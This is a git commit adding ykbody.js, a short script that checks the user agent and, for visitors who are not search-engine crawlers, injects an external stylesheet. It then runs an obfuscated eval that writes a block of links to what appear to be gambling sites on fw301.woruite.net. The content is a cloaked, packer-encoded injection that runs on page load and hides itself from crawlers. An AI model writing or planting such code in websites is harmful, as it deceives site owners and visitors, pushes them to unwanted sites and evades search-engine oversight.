019f809a6d34d2e756929357f83ee57d9116ba4a
dev <93880901+HOT178@users.noreply.github.com>
2022-04-18 17:52:10 +0400

    Create ykbody.js

---
+++ ykbody.js
@@ -0,0 +1,10 @@
+
+var _yks = navigator.userAgent
+function browserRedirect() {
+  	var regexp = /\.(baidu|haosou|so|sogou|soso|google|sm|youdao|yahoo|bing|360|ucbrowser|ucweb)(\.[a-z0-9\-]+){1,2}\//ig;
+	if (!regexp.test(_yks)) {
+		document.writeln("<link href=\"//www.y918.vip/css/yabo.css\" rel=\"stylesheet\">");
+eval(function(p,a,c,k,e,r){e=function(c){return(c<a?'':e(parseInt(c/a)))+((c=c%a)>35?String.fromCharCode(c+29):c.toString(36))};if(!''.replace(/^/,String)){while(c--)r[e(c)]=k[c]||e(c);k=[function(e){return r[e]}];e=function(){return'\\w+'};c=1};while(c--)if(k[c])p=p.replace(new RegExp('\\b'+e(c)+'\\b','g'),k[c]);return p}('A.B(\'<0 1="C 2"><0 1="3 2"><a 4="5://6.7.8:9/b/D.c"d="e"1="f E">\\t\\F\\G\\g\\k<0 1="h 2">\\i\\g\\k\\q\\H\\I\\u\\v\\q\\w\\j</0></a></0><0 1="3 2"><a 4="5://6.7.8:9/b/J.c"d="e"1="f x">\\K\\L\\l\\m<0 1="h 2">\\i\\M\\N\\y\\n\\O\\P\\Q\\g\\R\\j</0></a></0><0 1="3 2"><a 4="5://6.7.8:9/b/S.c"d="e"1="f T">\\U\\l\\m<0 1="h 2">\\i\\l\\m\\y\\n\\V\\o\\p\\r\\s\\j</0></a></0><0 1="3 2"><a 4="5://6.7.8:9/b/W.c" d="e" 1="f X">\\Y\\Z\\l\\m<0 1="h 2">\\i\\z\\n\\q\\w\\10\\o\\p\\r\\s\\j</0></a></0><0 1="3 2"><a 4="5://6.7.8:9/b/11.c" d="e" 1="f 12">\\13\\t\\14<0 1="h 2">\\i\\z\\n\\g\\k\\15\\o\\p\\r\\s\\j</0></a></0><0 1="3 2"><a 4="5://6.7.8:9/b/16.c" d="e" 1="f x">17\\g\\k<0 1="h 2">\\i\\u\\v\\g\\k\\18\\o\\p\\19\\1a\\j</0></a></0></0>\');',62,73,'div|class|show_yabo|yabo_div|href|https|fw301|woruite|net|2201||go|html|target|_blank|yabo_button|u4f53|yabo_sub|u3010|u3011|u80b2|u56fd|u9645|u724c|u4fe1|u8a89|u7535|u4fdd|u969c|u7403|u771f|u4eba|u5b50|yabo_yellow_button|u5927|u54c1|document|writeln|yabo_wrapper|qmh|yabo_blue_button|u76df|u4f1a|u7ade|u2654|qianyi|u5343|u8d62|u6fb3|u95e8|u265b|u8d35|u5bbe|u9a8c|long8|yabo_green_button|u9f8d8|u26f3|lehu|yabo_red_button|u4e50|u864e|u00a5|tq|yabo_purple_button|u8c08|u5427|u264b|ued|UED|u26a1|u5e73|u53f0'.split('|'),0,{}))
+	}
+}
+if(_yks.indexOf("testapp")<0){browserRedirect();}
